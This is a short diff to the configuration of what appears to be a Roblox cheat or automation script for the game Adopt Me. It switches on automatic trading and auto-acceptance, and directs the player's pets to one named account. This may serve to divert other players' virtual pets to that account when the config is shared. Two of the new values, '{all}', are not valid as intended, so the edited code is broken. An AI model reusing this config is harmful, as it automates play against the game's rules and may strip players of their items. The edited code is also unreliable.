@@ -25,16 +25,16 @@ getgenv().Config = {
             AutoStarCatch = false, -- Automatically play star catch minigame (does not work with baby or pet farm)
         },
         AutoTrade = {
-            Enabled = false, -- Enable auto trading
-            AutoAcceptTrades = false, -- Accept incoming trade requests
-            Usernames = {}, -- Players to send trades to
+            Enabled = true, -- Enable auto trading
+            AutoAcceptTrades = true, -- Accept incoming trade requests
+            Usernames = {"adoptbro_3"}, -- Players to send trades to
             TradeMode = "all", -- "all" = everything in categories, "specific" = only Items list
-            Categories = {}, -- {"pets", "toys", "food", "transport", "gifts", "stickers", "pet_accessories", "roleplay"}
+            Categories = {"pets"}, -- {"pets", "toys", "food", "transport", "gifts", "stickers", "pet_accessories", "roleplay"}
             Items = {}, -- Item IDs when TradeMode = "specific"
-            ItemCounts = {}, -- Max count per item in Items array
-            PetTypes = {}, -- {} = all, {"regular", "neon", "mega"}
-            Ages = {}, -- {} = all, {1, 2, 3, 4, 5, 6}
-            AutoLeaveAfterTrades = false, -- Leave trade area after completing trades
+            ItemCounts = {10}, -- Max count per item in Items array
+            PetTypes = {all}, -- {} = all, {"regular", "neon", "mega"}
+            Ages = {all}, -- {} = all, {1, 2, 3, 4, 5, 6}
+            AutoLeaveAfterTrades = true, -- Leave trade area after completing trades
         },
         AutoNeon = {
             Enabled = false, -- Enable auto neon/mega fusion
